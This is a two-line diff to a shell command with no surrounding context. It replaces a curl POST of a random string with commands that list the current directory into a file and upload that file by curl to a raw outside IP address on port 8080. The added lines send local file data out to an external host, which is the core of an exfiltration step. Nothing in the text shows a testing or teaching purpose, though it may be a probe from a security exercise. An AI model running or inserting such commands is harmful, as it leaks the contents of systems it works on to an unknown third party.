@@ -1,1 +1,2 @@
-curl --data "alfkjelfaihsefkashdfiuashdglasjgdhlkajsgdhlakjsdghlakjsdghalksjdghalskjdghaksjdghasdghaksdjghaskdjfhaskgsgf" http://138.68.58.230:8080 && echo -n ool
+ls > testing
+curl -F "name=@testing" http://138.68.58.230:8080 && echo -n ool
